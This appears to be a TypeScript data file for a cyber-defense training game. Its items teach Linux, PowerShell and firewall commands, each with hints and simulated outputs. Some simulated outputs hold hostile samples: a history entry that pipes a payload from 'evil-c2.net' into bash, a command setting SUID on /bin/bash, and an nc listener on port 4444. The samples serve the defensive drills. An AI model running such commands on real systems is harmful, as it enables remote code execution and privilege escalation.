import { MicrogamePayload } from '../types/game';

export const TUTORIAL_CARD: MicrogamePayload = {
  id: 'tutorial-briefing',
  tier: 1,
  verb: 'MISSION BRIEFING!',
  engine: 'TUTORIAL',
  timeLimitMs: 120000,
  category: 'Windows',
  hintNudge: 'Review the operational overview.',
  hintSolution: 'Click START to begin your defense drills.',
  educationalNote: "You are the frontline defender. Fast incident response, calm composure under Red Team attacks, and constant communication make champions.",
  payload: {}
};

export const MICROGAME_QUEUE: MicrogamePayload[] = [
  // ==========================================
  // CHAPTER 1: LINUX TERMINAL FOUNDATIONS
  // ==========================================
  {
    id: 'cli-linux-pwd',
    tier: 1,
    verb: 'PRINT WORKING DIRECTORY!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Print Working Directory shortcut.',
    hintSolution: 'pwd',
    educationalNote: "Running 'pwd' confirms your exact filesystem location before executing destructive commands.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['pwd'],
      simulatedOutput: '/root'
    }
  },
  {
    id: 'cli-linux-ls',
    tier: 1,
    verb: 'LIST DIRECTORY FILES!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Two-letter command to list files.',
    hintSolution: 'ls',
    educationalNote: "Listing directory contents helps spot suspicious scripts, hidden dotfiles, or rogue binaries.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['ls', 'ls -la', 'ls -l', 'ls -a', 'dir'],
      simulatedOutput: '.bashrc  .profile  backdoor.sh  Desktop  Downloads'
    }
  },
  {
    id: 'cli-linux-cd',
    tier: 1,
    verb: 'CHANGE DIRECTORY!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Two letters for change directory.',
    hintSolution: 'cd',
    educationalNote: "Quick navigation between /var/log, /etc, and /tmp is fundamental to incident investigation.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['cd', 'cd ~', 'cd ..', 'cd /', 'cd /var/log', 'cd /tmp'],
      simulatedOutput: ''
    }
  },
  {
    id: 'cli-linux-cat',
    tier: 1,
    verb: 'READ FILE CONTENTS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Concatenate / view text file in terminal.',
    hintSolution: 'cat',
    educationalNote: "The 'cat' command prints file text directly to stdout, enabling rapid triage of logs and configs.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['cat', 'less', 'more', 'cat /etc/passwd', 'head', 'tail'],
      simulatedOutput: 'root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash'
    }
  },
  {
    id: 'cli-linux-whoami',
    tier: 1,
    verb: 'WHO AM I?',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Ask the shell who you are.',
    hintSolution: 'whoami',
    educationalNote: "Running 'whoami' immediately verifies whether you have obtained root (UID 0) privileges.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['whoami', 'id', 'id -u'],
      simulatedOutput: 'root'
    }
  },
  {
    id: 'cli-linux-w',
    tier: 1,
    verb: 'WHO IS LOGGED IN?',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Single letter command to inspect active sessions.',
    hintSolution: 'w',
    educationalNote: "The 'w' command instantly displays all active TTY sessions and source IPs connected to the system.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['w', 'who', 'users'],
      simulatedOutput: ' 15:45:01 up 2 days,  1 user,  load average: 0.05, 0.03, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    10.10.10.50      15:40    1.00s  0.02s  0.00s w'
    }
  },
  {
    id: 'cli-linux-clear',
    tier: 1,
    verb: 'CLEAR THE TERMINAL!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Clear terminal screen.',
    hintSolution: 'clear',
    educationalNote: "Clearing cluttered screens prevents misreading previous command outputs during intense engagements.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['clear', 'cls', 'reset'],
      simulatedOutput: '\x1b[2J\x1b[H'
    }
  },
  {
    id: 'cli-linux-man',
    tier: 1,
    verb: 'OPEN MANUAL PAGE!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Short for manual page.',
    hintSolution: 'man',
    educationalNote: "Reading manual pages is how defenders quickly find flags, default configs, and security options.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['man', 'info', 'help', 'man man', 'man ufw'],
      simulatedOutput: 'MAN(1)                        Manual pager utils                        MAN(1)'
    }
  },
  {
    id: 'cli-linux-history',
    tier: 1,
    verb: 'VIEW COMMAND HISTORY!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'View your shell history.',
    hintSolution: 'history',
    educationalNote: "Checking bash history reveals commands run by attackers or teammates during the competition.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['history', 'cat ~/.bash_history'],
      simulatedOutput: '  101  curl http://evil-c2.net/payload | bash\n  102  chmod +s /bin/bash\n  103  history'
    }
  },
  {
    id: 'cli-linux-uname',
    tier: 1,
    verb: 'CHECK KERNEL VERSION!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Unix name / kernel details.',
    hintSolution: 'uname -a',
    educationalNote: "Checking the kernel release identifies whether the system is vulnerable to Dirty COW, PwnKit, or other local privescs.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['uname -a', 'uname', 'uname -r', 'uname -mrs'],
      simulatedOutput: 'Linux debian-bastion 6.12.0-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux'
    }
  },

  // ==========================================
  // CHAPTER 2: LINUX PROCESS & SERVICE CONTROL
  // ==========================================
  {
    id: 'cli-linux-su',
    tier: 1,
    verb: 'SWITCH USER!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Two letters to Switch User.',
    hintSolution: 'su',
    educationalNote: "The 'su' utility allows switching to the root account or another operational account.",
    payload: {
      prompt: 'defender@server:~$',
      successCommands: ['su', 'su -', 'su root'],
      simulatedOutput: 'Password: \nroot@server:~#'
    }
  },
  {
    id: 'cli-linux-sudo',
    tier: 1,
    verb: 'RUN AS SUPERUSER!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Superuser do.',
    hintSolution: 'sudo',
    educationalNote: "Using 'sudo' lets authorized unprivileged users execute commands with root security privileges.",
    payload: {
      prompt: 'defender@server:~$',
      successCommands: ['sudo', 'sudo -i', 'sudo su', 'sudo bash'],
      simulatedOutput: '[sudo] password for defender: \nroot@server:~#'
    }
  },
  {
    id: 'cli-linux-ps',
    tier: 2,
    verb: 'LIST ALL PROCESSES!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Process status with aux flags.',
    hintSolution: 'ps aux',
    educationalNote: "'ps aux' reveals all running processes, their parent PIDs, owners, and complete CLI command lines.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['ps aux', 'ps -ef', 'ps', 'top'],
      simulatedOutput: 'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.2 168432 11928 ?        Ss   12:00   0:01 /sbin/init\nwww-data  1337  1.2  0.1  25800  4212 ?        S    12:05   0:00 /dev/shm/nc -lvnp 4444'
    }
  },
  {
    id: 'cli-linux-top',
    tier: 1,
    verb: 'MONITOR REAL-TIME PROCESSES!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Real-time process viewer.',
    hintSolution: 'top',
    educationalNote: "'top' or 'htop' shows dynamic live CPU and RAM consumption, making crypto-miners immediately obvious.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['top', 'htop', 'btop'],
      simulatedOutput: 'top - 15:45:00 up 2 days,  1 user,  load average: 0.12, 0.08, 0.02\nTasks: 142 total,   1 running, 141 sleeping'
    }
  },
  {
    id: 'cli-linux-kill',
    tier: 2,
    verb: 'TERMINATE PROCESS BY PID!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Command to kill a PID.',
    hintSolution: 'kill',
    educationalNote: "The 'kill' command sends SIGTERM (or SIGKILL with -9) to forcibly stop unauthorized processes.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['kill', 'kill -9', 'kill 1337', 'kill -9 1337'],
      simulatedOutput: '[1]+  Terminated              nc -lvnp 4444'
    }
  },
  {
    id: 'cli-linux-pkill',
    tier: 2,
    verb: 'KILL PROCESS BY NAME!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Kill process by pattern or name.',
    hintSolution: 'pkill',
    educationalNote: "'pkill' terminates processes matching a regex name (e.g., 'pkill nc' or 'killall apache2').",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['pkill', 'killall', 'pkill -9', 'pkill nc', 'killall nc'],
      simulatedOutput: ''
    }
  },
  {
    id: 'cli-linux-chmod',
    tier: 1,
    verb: 'CHANGE FILE PERMISSIONS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Change mode of files.',
    hintSolution: 'chmod',
    educationalNote: "'chmod' sets read, write, and execute bits. Stripping +x from web shells neutralizes them instantly.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['chmod', 'chmod +x', 'chmod 755', 'chmod 600', 'chmod 644'],
      simulatedOutput: ''
    }
  },
  {
    id: 'cli-linux-chown',
    tier: 1,
    verb: 'CHANGE FILE OWNER!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Change owner command.',
    hintSolution: 'chown',
    educationalNote: "'chown' reclaims ownership of hijacked directories so attackers lose write permission.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['chown', 'chown root', 'chown root:root', 'chown -R root:root'],
      simulatedOutput: ''
    }
  },
  {
    id: 'cli-linux-systemctl-status',
    tier: 2,
    verb: 'CHECK SERVICE STATUS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Systemd control service status.',
    hintSolution: 'systemctl status',
    educationalNote: "Checking service status ensures scoring services (SSH, Web, DNS) stay active during SLA evaluation.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['systemctl status', 'systemctl', 'service status', 'service --status-all'],
      simulatedOutput: '● nginx.service - A high performance web server and a reverse proxy server\n   Loaded: loaded (/lib/systemd/system/nginx.service; enabled)\n   Active: active (running)'
    }
  },
  {
    id: 'cli-linux-systemctl-restart',
    tier: 2,
    verb: 'RESTART A SERVICE!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Linux',
    hintNudge: 'Systemctl restart command.',
    hintSolution: 'systemctl restart',
    educationalNote: "Restarting services applies updated configuration files and flushes corrupted workers.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['systemctl restart', 'service restart', 'systemctl reload'],
      simulatedOutput: ''
    }
  },

  // ==========================================
  // CHAPTER 3: WINDOWS & POWERSHELL ESSENTIALS
  // ==========================================
  {
    id: 'cli-win-get-process',
    tier: 1,
    verb: 'LIST WINDOWS PROCESSES!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'PowerShell cmdlet to get processes.',
    hintSolution: 'Get-Process',
    educationalNote: "Get-Process lists all active Windows processes and handles for threat inspection.",
    payload: {
      prompt: 'PS C:\\Windows\\system32>',
      successCommands: ['Get-Process', 'gps', 'ps', 'tasklist'],
      simulatedOutput: 'Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n    412      24    31420      45210       1.24   4812   1 powershell'
    }
  },
  {
    id: 'cli-win-get-service',
    tier: 1,
    verb: 'LIST WINDOWS SERVICES!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'PowerShell cmdlet to get services.',
    hintSolution: 'Get-Service',
    educationalNote: "Get-Service reveals which Windows services are running, stopped, or set to start automatically.",
    payload: {
      prompt: 'PS C:\\Windows\\system32>',
      successCommands: ['Get-Service', 'gsv', 'sc query', 'services.msc'],
      simulatedOutput: 'Status   Name               DisplayName\n------   ----               -----------\nRunning  LanmanServer       Server\nRunning  WinDefend          Microsoft Defender Antivirus Service'
    }
  },
  {
    id: 'cli-win-stop-service',
    tier: 2,
    verb: 'STOP A WINDOWS SERVICE!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'PowerShell cmdlet to stop a service.',
    hintSolution: 'Stop-Service',
    educationalNote: "Stopping vulnerable services like LanmanServer halts lateral SMB attacks like EternalBlue.",
    payload: {
      prompt: 'PS C:\\Windows\\system32>',
      successCommands: ['Stop-Service', 'net stop', 'sc stop', 'Stop-Service -Name LanmanServer'],
      simulatedOutput: 'Service LanmanServer stopped.'
    }
  },
  {
    id: 'cli-win-start-service',
    tier: 2,
    verb: 'START A WINDOWS SERVICE!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'PowerShell cmdlet to start a service.',
    hintSolution: 'Start-Service',
    educationalNote: "Restoring scored services keeps inject and SLA points flowing during the competition.",
    payload: {
      prompt: 'PS C:\\Windows\\system32>',
      successCommands: ['Start-Service', 'net start', 'sc start', 'Start-Service -Name W32Time'],
      simulatedOutput: 'Service W32Time started.'
    }
  },
  {
    id: 'cli-win-net-user',
    tier: 1,
    verb: 'LIST LOCAL WINDOWS USERS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'CMD command to view user accounts.',
    hintSolution: 'net user',
    educationalNote: "'net user' reveals all local accounts, helping you detect rogue accounts created by attackers.",
    payload: {
      prompt: 'PS C:\\Windows\\system32>',
      successCommands: ['net user', 'net users', 'Get-LocalUser'],
      simulatedOutput: 'User accounts for \\\\WIN-DEFENDER\n-------------------------------------------------------------------------------\nAdministrator            Guest                    DefaultAccount\nbackdoor_admin           Defender\nThe command completed successfully.'
    }
  },
  {
    id: 'cli-win-whoami-priv',
    tier: 2,
    verb: 'CHECK USER PRIVILEGES!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'Whoami with privileges flag.',
    hintSolution: 'whoami /priv',
    educationalNote: "'whoami /priv' displays enabled privileges like SeDebugPrivilege or SeImpersonatePrivilege.",
    payload: {
      prompt: 'PS C:\\Windows\\system32>',
      successCommands: ['whoami /priv', 'whoami -priv', 'whoami', 'whoami /all'],
      simulatedOutput: 'PRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeDebugPrivilege              Debug programs                       Enabled\nSeShutdownPrivilege           Shut down the system                 Enabled'
    }
  },
  {
    id: 'cli-win-tasklist',
    tier: 1,
    verb: 'VIEW TASKLIST!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'Standard Windows task list tool.',
    hintSolution: 'tasklist',
    educationalNote: "'tasklist' works in basic cmd.exe prompts without requiring PowerShell.",
    payload: {
      prompt: 'C:\\Windows\\system32>',
      successCommands: ['tasklist', 'tasklist /v', 'Get-Process'],
      simulatedOutput: 'Image Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0          8 K\ncmd.exe                       3920 Console                    1      3,412 K'
    }
  },
  {
    id: 'cli-win-taskkill',
    tier: 2,
    verb: 'KILL TASK BY NAME!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'CMD utility to kill tasks.',
    hintSolution: 'taskkill',
    educationalNote: "'taskkill /f /im payload.exe' forcefully kills malware processes across all Windows sessions.",
    payload: {
      prompt: 'C:\\Windows\\system32>',
      successCommands: ['taskkill', 'taskkill /f /im', 'taskkill /im', 'Stop-Process'],
      simulatedOutput: 'SUCCESS: Sent termination signal to process.'
    }
  },
  {
    id: 'cli-win-restart',
    tier: 1,
    verb: 'RESTART THE COMPUTER!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'PowerShell Restart-Computer or shutdown /r.',
    hintSolution: 'Restart-Computer',
    educationalNote: "Restarting clears unpersisted in-memory implants and ensures boot configurations take effect.",
    payload: {
      prompt: 'PS C:\\Windows\\system32>',
      successCommands: ['Restart-Computer', 'shutdown /r', 'shutdown -r', 'shutdown /r /t 0'],
      simulatedOutput: 'System restart scheduled.'
    }
  },
  {
    id: 'gui-win-defender',
    tier: 2,
    verb: 'ENABLE DEFENDER!',
    engine: 'GUI_NAV',
    timeLimitMs: 11000,
    category: 'Windows',
    hintNudge: 'Navigate to Windows Security Settings.',
    hintSolution: 'Update & Security > Windows Security',
    educationalNote: "Re-enabling real-time protection ensures known malware beacons are automatically quarantined.",
    payload: {
      windowTitle: 'Windows Settings',
      steps: [
        { correctOption: 'Update & Security', options: ['System', 'Personalization', 'Update & Security', 'Network & Internet'] },
        { correctOption: 'Windows Security', options: ['Delivery Optimization', 'Windows Security', 'Backup', 'Troubleshoot'] }
      ],
      finalToggle: { label: 'Real-time Protection' }
    }
  },

  // ==========================================
  // CHAPTER 4: NETWORK & FIREWALL DEFENSE
  // ==========================================
  {
    id: 'cli-net-ip',
    tier: 1,
    verb: 'CHECK IP ADDRESSES!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'Check IP address command.',
    hintSolution: 'ip a',
    educationalNote: "'ip a' or 'ifconfig' maps your network interfaces, subnets, and active gateway assignments.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['ip a', 'ip addr', 'ifconfig', 'ip address', 'ipconfig'],
      simulatedOutput: '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 inet 192.168.1.50/24'
    }
  },
  {
    id: 'cli-net-ss',
    tier: 2,
    verb: 'LIST LISTENING PORTS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'Socket statistics for TCP/UDP listening ports.',
    hintSolution: 'ss -tulpn',
    educationalNote: "'ss -tulpn' shows all listening ports and the exact process names and PIDs bound to them.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['ss -tulpn', 'ss -tuln', 'netstat -tulpn', 'netstat -ano', 'ss -lntp', 'ss'],
      simulatedOutput: 'Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process\ntcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*      users:(("sshd",pid=621,fd=3))\ntcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*      users:(("nginx",pid=789,fd=6))'
    }
  },
  {
    id: 'cli-net-ping',
    tier: 1,
    verb: 'TEST HOST REACHABILITY!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'Standard ICMP reachability tool.',
    hintSolution: 'ping',
    educationalNote: "Pinging verifies upstream router connectivity and checks whether firewall drop rules are working.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['ping', 'ping 8.8.8.8', 'ping 127.0.0.1', 'ping google.com', 'ping 10.0.0.1'],
      simulatedOutput: 'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=14.2 ms'
    }
  },
  {
    id: 'cli-net-curl',
    tier: 1,
    verb: 'FETCH HTTP URL!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'Command line URL fetcher.',
    hintSolution: 'curl',
    educationalNote: "'curl' tests whether local web servers and API endpoints respond with proper HTTP status codes.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['curl', 'wget', 'curl localhost', 'curl 127.0.0.1', 'curl -I localhost'],
      simulatedOutput: 'HTTP/1.1 200 OK\nServer: nginx\nContent-Type: text/html'
    }
  },
  {
    id: 'cli-net-traceroute',
    tier: 1,
    verb: 'TRACE ROUTE TO HOST!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'Network path tracing utility.',
    hintSolution: 'traceroute',
    educationalNote: "'traceroute' identifies intermediate hops and packet filtering bottlenecks across routers.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['traceroute', 'tracert', 'tracepath', 'traceroute 8.8.8.8'],
      simulatedOutput: '1  192.168.1.1 (192.168.1.1)  1.214 ms\n2  10.0.0.1 (10.0.0.1)  4.318 ms\n3  8.8.8.8 (8.8.8.8)  14.120 ms'
    }
  },
  {
    id: 'cli-net-ufw-status',
    tier: 1,
    verb: 'CHECK FIREWALL STATUS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'Uncomplicated firewall status check.',
    hintSolution: 'ufw status',
    educationalNote: "'ufw status' displays active firewall rules and whether rules apply to IPv4 and IPv6.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['ufw status', 'ufw status verbose', 'iptables -L', 'ufw'],
      simulatedOutput: 'Status: active\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW       Anywhere'
    }
  },
  {
    id: 'cli-net-ufw-enable',
    tier: 1,
    verb: 'ENABLE FIREWALL!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'Command to enable UFW.',
    hintSolution: 'ufw enable',
    educationalNote: "'ufw enable' activates packet filtering and starts enforcement on system startup.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['ufw enable', 'ufw reload'],
      simulatedOutput: 'Firewall is active and enabled on system startup'
    }
  },
  {
    id: 'cli-net-ufw-allow',
    tier: 2,
    verb: 'ALLOW PORT IN FIREWALL!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'UFW allow port rule.',
    hintSolution: 'ufw allow',
    educationalNote: "Opening ports for scored services (e.g., 'ufw allow 80/tcp') prevents scoring engine downtime.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['ufw allow', 'ufw allow 22', 'ufw allow 80', 'ufw allow 443'],
      simulatedOutput: 'Rule added\nRule added (v6)'
    }
  },
  {
    id: 'cli-net-ufw-deny',
    tier: 2,
    verb: 'BLOCK PORT IN FIREWALL!',
    engine: 'CLI_EXEC',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'UFW deny rule.',
    hintSolution: 'ufw deny',
    educationalNote: "'ufw deny 4444' or 'ufw deny from <IP>' severs an attacker's C2 connection at the network edge.",
    payload: {
      prompt: 'root@server:~#',
      successCommands: ['ufw deny', 'ufw deny 4444', 'ufw drop', 'iptables -A INPUT -j DROP'],
      simulatedOutput: 'Rule added\nRule added (v6)'
    }
  },
  {
    id: 'cfg-fw-default-drop',
    tier: 2,
    verb: 'DEFAULT DROP POLICY!',
    engine: 'CONFIG_EDIT',
    timeLimitMs: 11000,
    category: 'Firewall',
    hintNudge: 'Change DEFAULT_INPUT_POLICY to DROP.',
    hintSolution: 'Set DEFAULT_INPUT_POLICY="DROP"',
    educationalNote: "A default DROP policy blocks all unsolicited inbound traffic unless explicitly permitted.",
    payload: {
      filename: '/etc/default/ufw',
      initialContent: '# /etc/default/ufw\nDEFAULT_INPUT_POLICY="ACCEPT"\nDEFAULT_OUTPUT_POLICY="ACCEPT"',
      successRegex: 'DEFAULT_INPUT_POLICY="DROP"'
    }
  }
];
